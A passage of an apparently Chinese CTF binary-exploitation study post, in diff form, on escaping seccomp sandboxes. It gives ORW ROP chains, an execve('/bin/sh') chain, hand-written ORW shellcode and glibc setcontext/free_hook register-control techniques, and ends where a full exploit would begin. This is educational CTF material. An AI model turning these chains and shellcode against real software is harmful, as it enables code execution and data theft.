+ 0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>生成16进制字符串</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#seccomp-tools asm 1.asm</span>
+<span class="token string">"x20x00x00x00x00x00x00x00x15x00x02x00x01x01x00x00x15x00x02x00x01x00x00x00x06x00x00x00x00x00xFFx7Fx06x00x00x00x00x00x05x00x06x00x00x00x00x00xFFx7F"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="沙盒的绕过"><a href="#沙盒的绕过" class="headerlink" title="沙盒的绕过"></a>沙盒的绕过</h1><p>首先复习寄存器的约定：</p>
+<p>在64位的x86架构中，函数调用时使用的寄存器约定为：</p>
+<ol>
+<li><p>参数寄存器：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>寄存器</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第一个参数</td>
+<td>RDI</td>
+</tr>
+<tr>
+<td>第二个参数</td>
+<td>RSI</td>
+</tr>
+<tr>
+<td>第三个参数</td>
+<td>RDX</td>
+</tr>
+<tr>
+<td>第四个参数</td>
+<td>RCX</td>
+</tr>
+<tr>
+<td>第五个参数</td>
+<td>R8</td>
+</tr>
+<tr>
+<td>第六个参数</td>
+<td>R9</td>
+</tr>
+</tbody></table>
+<p>浮点参数存储在 <code>XMM0</code> 到 <code>XMM7</code> 寄存器中。</p>
+</li>
+<li><p>返回值寄存器：</p>
+<ul>
+<li>整型返回值存储在寄存器 <code>RAX</code> 中。</li>
+<li>浮点返回值存储在寄存器 <code>XMM0</code> 中。</li>
+</ul>
+</li>
+<li><p>其他寄存器：</p>
+<ul>
+<li>寄存器 <code>RBX</code>、<code>RBP</code>、<code>R12</code>、<code>R13</code>、<code>R14</code>、<code>R15</code> 在函数调用期间被视为被调用者保存寄存器，即在函数调用前后需要保持其值不变。</li>
+<li>寄存器 <code>RSP</code> 用于栈指针。</li>
+</ul>
+</li>
+</ol>
+<h2 id="1-简单栈利用："><a href="#1-简单栈利用：" class="headerlink" title="1.简单栈利用："></a>1.简单栈利用：</h2><p>通过栈溢出控制程序返回流构造rop链依次执行open、read、write函数。</p>
+<p>例题：ciscn2023 烧烤摊</p>
+<p>整数溢出后存在栈溢出，栈溢出后orw</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">name_addr <span class="token operator">=</span> <span class="token number">0x04E60F0</span>
+
+<span class="token comment">#1.orw</span>
+payload <span class="token operator">=</span> <span class="token string">b"/flag\x00"</span>                                         <span class="token operator">//</span>name即为flag，name_addr <span class="token operator">=</span> flag_addr
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>r_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fopen64_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+<span class="token comment">#若bss段地址可写，可直接写入orw_shellocode</span>
+payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/home/ctf/flag.txt'</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span> <span class="token operator">+</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> bss_addr<span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#2.syscall</span>
+payload <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x08</span> 
+            <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">)</span> 
+            <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span> 
+            <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
+            <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_rbx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 
+            <span class="token operator">+</span> p64<span class="token punctuation">(</span>syscall_addr<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>NX可以防止攻击者将数据区域（如栈或堆）中的代码作为执行指令</p>
+<h2 id="2-orw-shellcode"><a href="#2-orw-shellcode" class="headerlink" title="2.orw+shellcode:"></a>2.orw+shellcode:</h2><p>针对于NX未开启且禁用execve系统调用的程序，即可以写入shellcode，分两段写入</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> shellcode1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> shellcode2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>第一段写入orw代码,返回地址填入jmp rsp地址，第二段写入控制rsp的代码：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode1 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>cat<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    	<span class="token operator">//</span>直接调用cat读取
+
+<span class="token operator">//</span>或
+shellcode <span class="token operator">=</span> <span class="token string">''</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'esp'</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+payload1 <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
+<span class="token operator">//</span>或
+shellcode1 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+    push 0x67616c66 
+    mov rdi,rsp
+    xor esi,esi
+    push 2
+    pop rax
+    syscall
+
+	mov edi,eax                   
+	mov rsi,rsp
+	sub rsi,50
+	xor eax,eax
+	syscall
+
+	xor edi,2		#mov dil,1
+	mov eax,edi		#mov al,1
+	syscall
+
+或
+	mov rdi,rax
+	mov rsi,rsp
+	mov edx,0x100
+	xor eax,eax
+	syscall
+	mov edi,1
+	mov rsi,rsp
+	push 1
+	pop rax
+	syscall
+
+'''</span><span class="token punctuation">)</span>                                      	<span class="token operator">//</span>即调用<span class="token builtin">open</span>、read、write函数
+
+shellcode1 <span class="token operator">=</span> shellcode1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span> 	<span class="token operator">//</span>offset <span class="token operator">=</span> 距离rbp偏移 
+
+shellcoe2 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'sub rsp,0x30;call rsp'</span><span class="token punctuation">)</span>      	<span class="token operator">//</span>控制执行流回到初始地方执行shellcode
+
+payload <span class="token operator">=</span> shellcode1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>jmp rsp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> shellcode2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>文件标识符中0、1、2是默认打开的接下来打开的会按照3、4、5……这样排列</strong></p>
+<h2 id="3、思路"><a href="#3、思路" class="headerlink" title="3、思路"></a>3、思路</h2><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰了，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">53</span><span class="token operator">></span><span class="token operator">:</span>  mov    rsp<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0xa0</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token operator">:</span>  mov    rbx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x80</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span><span class="token operator">:</span>  mov    rbp<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x78</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span><span class="token operator">:</span>  mov    r12<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x48</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>  mov    r13<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x50</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span><span class="token operator">:</span>  mov    r14<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x58</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">83</span><span class="token operator">></span><span class="token operator">:</span>  mov    r15<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x60</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span><span class="token operator">:</span>  mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0xa8</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">94</span><span class="token operator">></span><span class="token operator">:</span>  push   rcx
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">95</span><span class="token operator">></span><span class="token operator">:</span>  mov    rsi<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span><span class="token operator">:</span>  mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x88</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">106</span><span class="token operator">></span><span class="token operator">:</span> mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x98</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">113</span><span class="token operator">></span><span class="token operator">:</span> mov    r8<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">117</span><span class="token operator">></span><span class="token operator">:</span> mov    r9<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">121</span><span class="token operator">></span><span class="token operator">:</span> mov    rdi<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rdi<span class="token operator">+</span><span class="token number">0x68</span><span class="token punctuation">]</span>
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">125</span><span class="token operator">></span><span class="token operator">:</span> xor    eax<span class="token punctuation">,</span>eax
+<span class="token operator">&lt;</span>setcontext<span class="token operator">+</span><span class="token number">127</span><span class="token operator">></span><span class="token operator">:</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一般是通过<code>free_hook</code>由于free的时候rdi是可控的，那么就可以在free_hook上放置setcontext的指针，再free的时候就会把可控区域的值填充到寄存器中，从而获得更强大的控制流</p>
+<h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580</span>DD                 mov     rsp<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">0</span>A0h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580E4</span>                 mov     rbx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">80</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580</span>EB                 mov     rbp<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">78</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580</span>EF                 mov     r12<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">48</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580F</span><span class="token number">3</span>                 mov     r13<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">50</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580F</span><span class="token number">7</span>                 mov     r14<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">58</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580F</span>B                 mov     r15<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">60</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000580FF</span>                 test    dword ptr fs<span class="token operator">:</span><span class="token number">48</span>h<span class="token punctuation">,</span> <span class="token number">2</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>C6                 mov     rcx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">0</span>A8h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>CD                 push    rcx
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>CE                 mov     rsi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">70</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>D2                 mov     rdi<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">68</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>D6                 mov     rcx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">98</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>DD                 mov     r8<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">28</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581E1</span>                 mov     r9<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">30</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581E5</span>                 mov     rdx<span class="token punctuation">,</span> <span class="token punctuation">[</span>rdx<span class="token operator">+</span><span class="token number">88</span>h<span class="token punctuation">]</span>
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>EC                 xor     eax<span class="token punctuation">,</span> eax
+<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">00000000000581</span>EE                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但是我们很难找到能够直接控制rdx寄存器的gadgets</p>
+<p>但是在 <code>getkeyserv_handle+576</code>，其汇编如下</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     rdx, [rdi+8]
+mov     [rsp+0C8h+var_C8], rax
+call    qword ptr [rdx+20h]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p>
+<p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p>
+<p> 附上本人亲自手绘plus版本的图</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>地址</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rdi</td>
+<td></td>
+<td>rdi+8h</td>
+<td>RDX</td>
+</tr>
+<tr>
+<td>rdi+10h</td>
+<td></td>
+<td>rdi+18h</td>
+<td></td>
+</tr>
+<tr>
+<td>rdi+20h</td>
+<td></td>
+<td>rdi+28h</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>前后两张图，大部分时候是会重叠的，取决于可控制区域的大小呢</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>值</th>
+<th>地址</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rdx</td>
+<td></td>
+<td>rdx+8h</td>
+<td></td>
+</tr>
+<tr>
+<td>rdx+10h</td>
+<td></td>
+<td>rdx+18h</td>
+<td></td>
+</tr>
+<tr>
+<td>rdx+20h</td>
+<td>setcontext的指针</td>
+<td>rdx+28h</td>
+<td>R8</td>
+</tr>
+<tr>
+<td>rdx+30h</td>
+<td>R9</td>
+<td>rdx+38h</td>
+<td></td>
+</tr>
+<tr>
+<td>rdx+40h</td>
+<td></td>
+<td>rdx+48h</td>
+<td>R12</td>
+</tr>
+<tr>
+<td>rdx+50h</td>
+<td>R13</td>
+<td>rdx+58h</td>
+<td>R14</td>
+</tr>
+<tr>
+<td>rdx+60h</td>
+<td>R15</td>
+<td>rdx+68h</td>
+<td>RDI</td>
+</tr>
+<tr>
+<td>rdx+70h</td>
+<td>RSI</td>
+<td>rdx+78h</td>
+<td>RBP</td>
+</tr>
+<tr>
+<td>rdx+80h</td>
+<td>RBX</td>
+<td>rdx+88h</td>
+<td>RDX</td>
+</tr>
+<tr>
+<td>rdx+90h</td>
+<td></td>
+<td>rdx+98h</td>
+<td>RCX</td>
+</tr>
+<tr>
+<td>rdx+a0h</td>
+<td>RSP</td>
+<td>rdx+a8h</td>
+<td>RCX</td>
+</tr>
+<tr>
+<td>rdx+b0h</td>
+<td></td>
+<td>rdx+b8h</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>这里附上学到的程序写法：</strong></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+ra <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
+rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
+ia <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+c <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+li <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
+db <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>这些是定义一个函数，然后lambda后面的是参数，看着挺好用的，第一次学会</strong></p>
+<h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><p>这种<code>shellcode</code>题目除了掌握基本的<code>orw_shellcode</code>外，要时刻关注执行<code>shellcode</code>前后的寄存器变化，根据寄存器写<code>shellcode</code>。</p>
+<p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/218678/6/25270/21739/63b83fb5Fc42dc228/e207fa91b6c24ab5.png" alt="img"></p>
+<ul>
+<li>首先<code>shellcode</code>有<code>16</code>个字节大小的限制，这也就意味着接下来我们要用<code>16</code>个字节大小限制的<code>shellcode</code>扩大漏洞利用能力。</li>
+</ul>
+<p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/157748/33/33698/56517/63b8408eFc10e2b83/c51017ea28f05343.png" alt="img"></p>
+<ul>
+<li>调试并根据寄存器编写一下<code>shellcode</code>，目标是写入更多数据到<code>0xcafe0000</code>这片空间并执行：</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">shellcode1&#x3D;asm(&#39;&#39;&#39;
+    mov rdi,rax
+    mov rsi,rdx
+    mov edx,0x100
+    syscall
+    call rsi
+    nop
+&#39;&#39;&#39;)
+print(len(shellcode1))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>而后就是编写常规的<code>orw</code>的<code>shellcode</code>，注意开头需要多写一些<code>nop</code>，否则写出的就不是目标<code>flag</code>，猜测是控制相关问题：</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode2<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    push 0x67616c66        ##flag##
+    mov rdi,rsp
+    xor esi,esi
+    push 2
+    pop rax
+    syscall
+    mov rdi,rax
+    mov rsi,rsp
+    mov edx,0x100
+    xor eax,eax
+    syscall
+    mov edi,1
+    mov rsi,rsp
+    push 1
+    pop rax
+    syscall
+'''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>总的<code>exp</code>如下：</li>
